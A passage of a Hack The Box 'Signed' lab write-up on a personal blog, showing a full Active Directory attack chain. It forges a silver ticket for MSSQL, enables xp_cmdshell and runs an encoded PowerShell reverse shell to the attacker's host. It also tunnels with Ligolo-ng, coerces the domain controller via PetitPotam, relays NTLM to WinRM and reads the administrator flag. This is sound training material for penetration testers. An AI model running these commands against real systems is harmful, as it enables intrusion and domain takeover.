+<p>Now we compute the NT hash of <code>mssqlsvc</code>‘s password and forge the ticket:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ pypykatz crypto nt &#x27;purPLE9795!@&#x27;</span><br><span class="line">ef699384c3285c54128a3ee1ddb1a0cc</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn pwn/dc01.signed.htb  -groups 512,519,1105 -user-id 1103 mssqlsvc</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket for signed.htb/mssqlsvc</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket in mssqlsvc.ccache</span><br></pre></td></tr></table></figure></div>
+
+<p>Using the forged ticket to connect — <strong>make sure to use the FQDN</strong>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -k dc01.signed.htb</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we are now <code>dbo</code> — confirming sysadmin:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) as sysadmin_check;</span><br><span class="line">sysadmin_check</span><br><span class="line">--------------</span><br><span class="line">             1</span><br><span class="line"></span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We enable <code>xp_cmdshell</code> and get code execution:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; EXECUTE sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">INFO(DC01): Line 196: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">INFO(DC01): Line 196: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; EXECUTE xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">output</span><br><span class="line">---------------</span><br><span class="line">signed\mssqlsvc</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can read the root flag directly via <code>OPENROWSET</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; SELECT * FROM OPENROWSET(BULK &#x27;C:\Users\Administrator\Desktop\root.txt&#x27;, SINGLE_CLOB) AS Contents;</span><br><span class="line">BulkColumn</span><br><span class="line">---------------------------------------</span><br><span class="line">b&#x27;89c9a2dd2a4f8116fcb00e266ec549fd\r\n&#x27;</span><br><span class="line"></span><br><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And get a proper reverse shell with a base64-encoded PowerShell payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  dbo@master)&gt; EXECUTE xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.129.193.36] 50844</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; whoami</span><br><span class="line">signed\mssqlsvc</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a><a href="#PrivEsc" title="Privilege Escalation"></a>Privilege Escalation</h2><p>To escalate to <code>Administrator</code>, we need to pivot through the DC. We upload and run <a class="link"   target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng" >Ligolo-ng <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> on the target to create a tunnel back to our machine:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\mssqlsvc\desktop&gt; ./agent.exe  -connect 10.10.16.7:11601 -ignore-cert</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./proxy -selfcert -laddr 0.0.0.0:11601</span><br><span class="line">INFO[0000] Loading configuration file ligolo-ng.yaml</span><br><span class="line">WARN[0000] Using default selfcert domain &#x27;ligolo&#x27;, beware of CTI, SOC and IoC!</span><br><span class="line">INFO[0000] Listening on 0.0.0.0:11601</span><br><span class="line">INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080</span><br><span class="line">WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.</span><br><span class="line">    __    _             __</span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/</span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /</span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /</span><br><span class="line">        /____/                          /____/</span><br><span class="line"></span><br><span class="line">  Made in France ♥            by @Nicocha30!</span><br><span class="line">  Version: 0.8.2</span><br><span class="line"></span><br><span class="line">ligolo-ng » interface_listINFO[0004] Agent joined.                                 id=005056b0daca name=&quot;SIGNED\\mssqlsvc@DC01&quot; remote=&quot;10.129.193.194:65100&quot;</span><br><span class="line">ligolo-ng » interface_list</span><br><span class="line">┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Interface list                                                                                                              │</span><br><span class="line">├───┬──────────────┬─────────────────────────────────────────────────────────────────────────────────────┬────────────────────┤</span><br><span class="line">│ # │ TAP NAME     │ DST ROUTES                                                                          │ STATE              │</span><br><span class="line">├───┼──────────────┼─────────────────────────────────────────────────────────────────────────────────────┼────────────────────┤</span><br><span class="line">│ 0 │ tun0         │ 10.10.10.0/23,10.10.16.0/23,10.129.0.0/16,dead:beef::/64,dead:beef:4::/64,fe80::/64 │ Active - 6 routes  │</span><br><span class="line">│ 1 │ ligolosample │ 10.254.0.0/24,10.255.0.0/24                                                         │ Pending - 2 routes │</span><br><span class="line">│ 2 │ ligolo       │ 10.129.0.0/16,240.0.0.1/32,fe80::/64                                                │ Active - 3 routes  │</span><br><span class="line">│ 3 │ evil-cha     │ 10.129.0.0/16                                                                       │ Pending - 1 routes │</span><br><span class="line">└───┴──────────────┴─────────────────────────────────────────────────────────────────────────────────────┴────────────────────┘</span><br><span class="line">Interfaces and routes with &quot;Pending&quot; state will be created on tunnel start.</span><br><span class="line">ligolo-ng » session</span><br><span class="line">? Specify a session : 1 - SIGNED\mssqlsvc@DC01 - 10.129.193.194:65100 - 005056b0daca</span><br><span class="line">[Agent : SIGNED\mssqlsvc@DC01] » start</span><br><span class="line">INFO[0010] Starting tunnel to SIGNED\mssqlsvc@DC01 (005056b0daca)</span><br></pre></td></tr></table></figure></div>
+
+<p>We set up <code>240.0.0.1</code> as a <a class="link"   target="_blank" rel="noopener" href="https://docs.ligolo.ng/Localhost/" >local port proxy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> so we can interact with the DC’s localhost services. Confirming Kerberos is reachable:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 240.0.0.1 -p 88 -Pn</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 02:58 EDT</span><br><span class="line">Nmap scan report for 240.0.0.1</span><br><span class="line">Host is up (0.50s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">88/tcp open  kerberos-sec</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>Checking for coercion vulnerabilities with <code>nxc</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 240.0.0.1 -u mssqlsvc -p &#x27;purPLE9795!@&#x27; -M coerce_plus</span><br><span class="line">SMB         240.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         240.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, DFSCoerce</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PetitPotam</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PrinterBug</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PrinterBug</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, MSEven</span><br></pre></td></tr></table></figure></div>
+
+<p>The DC is vulnerable to <strong>PetitPotam</strong>. The trick here is that we need the DC to authenticate to a hostname that resolves to our attacker IP — so we use <code>dnstool</code> to add a DNS record pointing to our machine:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ dnstool -u &#x27;SIGNED.HTB\mssqlsvc&#x27; -p &#x27;purPLE9795!@&#x27; 240.0.0.1 -a add -d 10.10.16.7 -r &#x27;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA&#x27;</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Adding new record</span><br><span class="line">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure></div>
+
+<p>Confirming it resolves:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @240.0.0.1 +tcp</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.9-1-Debian &lt;&lt;&gt;&gt; localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.h</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32782</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. IN A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. 180 IN A 240.0.0.1</span><br><span class="line"></span><br><span class="line">;; Query time: 480 msec</span><br><span class="line">;; SERVER: 240.0.0.1#53(240.0.0.1) (TCP)</span><br><span class="line">;; WHEN: Wed Oct 15 02:55:42 EDT 2025</span><br><span class="line">;; MSG SIZE  rcvd: 109</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we set up <code>ntlmrelayx</code> to relay the incoming authentication to WinRM on the DC:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads/impacket/examples]</span><br><span class="line">└─$ python3 ntlmrelayx.py -smb2support -t winrms://240.0.0.1 -i -debug</span><br><span class="line">Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /home/kali/Downloads/impacket/impacket</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client WINRMS loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack WINRMS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server on port 445</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up WCF Server on port 9389</span><br><span class="line">[*] Setting up RAW Server on port 6666</span><br><span class="line">[*] Setting up WinRM (HTTP) Server on port 5985</span><br><span class="line">[*] Setting up WinRMS (HTTPS) Server on port 5986</span><br><span class="line">[*] Setting up RPC Server on port 135</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br></pre></td></tr></table></figure></div>
+
+<p>And trigger PetitPotam through our custom DNS name:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nxc smb 240.0.0.1 -u mssqlsvc -p &#x27;purPLE9795!@&#x27; -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</span><br><span class="line">SMB         240.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         240.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PetitPotam</span><br><span class="line">COERCE_PLUS 240.0.0.1       445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile</span><br></pre></td></tr></table></figure></div>
+
+<p>The relay succeeds and we get an interactive WinRM shell:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] (SMB): Received connection from 10.129.193.194, attacking target winrms://240.0.0.1</span><br><span class="line">[!] The client requested signing, relaying to WinRMS might not work!</span><br><span class="line">[*] HTTP server returned error code 500, this is expected, treating as a successful login</span><br><span class="line">[*] (SMB): Authenticating connection from /@10.129.193.194 against winrms://240.0.0.1 SUCCEED [1]</span><br><span class="line">[*] winrms:///@240.0.0.1 [1] -&gt; Started interactive WinRMS shell via TCP on 127.0.0.1:11000</span><br><span class="line">[*] All targets processed!</span><br><span class="line">[*] (SMB): Connection from 10.129.193.194 controlled, but there are no more targets left!</span><br></pre></td></tr></table></figure></div>
+
+<p>Connecting to it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc 127.0.0.1 11000</span><br><span class="line">Type help for list of commands</span><br><span class="line"></span><br><span class="line"># cd</span><br><span class="line">C:\Windows\system32\config\systemprofile</span><br><span class="line"></span><br><span class="line"># powershell -c cat c:/users/administrator/desktop/root.txt</span><br><span class="line">1ebf8220ce4aa7a815c26c7623e6b8fd</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for Signed, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Signed</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-02-07 21:39:19</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-02-07 21:47:50
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/02/07/Hackthebox-Signed/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/01/31/Hackthebox-CodePartTwo/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: CodePartTwo</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Signed</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL-10-129-193-36-1433"><span class="nav-text">MSSQL - 10.129.193.36:1433</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-Silver-Ticket"><span class="nav-text">Enumeration &amp; Silver Ticket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
